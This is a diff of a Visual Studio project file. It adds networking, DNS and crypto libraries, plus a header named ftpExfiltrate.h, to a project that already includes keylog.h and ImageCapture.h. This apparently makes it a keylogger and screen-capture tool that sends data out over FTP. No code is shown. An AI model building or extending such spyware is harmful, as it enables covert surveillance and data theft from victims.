@@ -93,7 +93,7 @@
     <Link>
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalDependencies>ChilkatDbg.lib;ChilkatDbgDll.lib;ChilkatRel.lib;ChilkatRelDll.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>ws2_32.lib;dnsapi.lib;crypt32.lib;ChilkatDbg.lib;ChilkatDbgDll.lib;ChilkatRel.lib;ChilkatRelDll.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <AdditionalLibraryDirectories>$(SolutionDir)Dependencies\libs</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
@@ -112,7 +112,7 @@
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalDependencies>ChilkatDbg.lib;ChilkatDbgDll.lib;ChilkatRel.lib;ChilkatRelDll.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>ws2_32.lib;dnsapi.lib;crypt32.lib;ChilkatDbg.lib;ChilkatDbgDll.lib;ChilkatRel.lib;ChilkatRelDll.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <AdditionalLibraryDirectories>$(SolutionDir)Dependencies\libs</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
@@ -127,7 +127,7 @@
     <Link>
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalDependencies>ChilkatDbg.lib;ChilkatDbgDll.lib;ChilkatRel.lib;ChilkatRelDll.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>ws2_32.lib;dnsapi.lib;crypt32.lib;ChilkatDbg.lib;ChilkatDbgDll.lib;ChilkatRel.lib;ChilkatRelDll.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <AdditionalLibraryDirectories>$(SolutionDir)Dependencies\libs</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
@@ -146,13 +146,15 @@
       <EnableCOMDATFolding>true</EnableCOMDATFolding>
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
-      <AdditionalDependencies>ChilkatDbg.lib;ChilkatDbgDll.lib;ChilkatRel.lib;ChilkatRelDll.lib;%(AdditionalDependencies)</AdditionalDependencies>
+      <AdditionalDependencies>ws2_32.lib;dnsapi.lib;crypt32.lib;ChilkatDbg.lib;ChilkatDbgDll.lib;ChilkatRel.lib;ChilkatRelDll.lib;%(AdditionalDependencies)</AdditionalDependencies>
       <AdditionalLibraryDirectories>$(SolutionDir)Dependencies\libs</AdditionalLibraryDirectories>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
     <ClInclude Include="basewin.h" />
     <ClInclude Include="framework.h" />
+    <ClInclude Include="ftpExfiltrate.h" />
+    <ClInclude Include="SetInterval.h" />
     <ClInclude Include="helper.h" />
     <ClInclude Include="ImageCapture.h" />
     <ClInclude Include="keylog.h" />
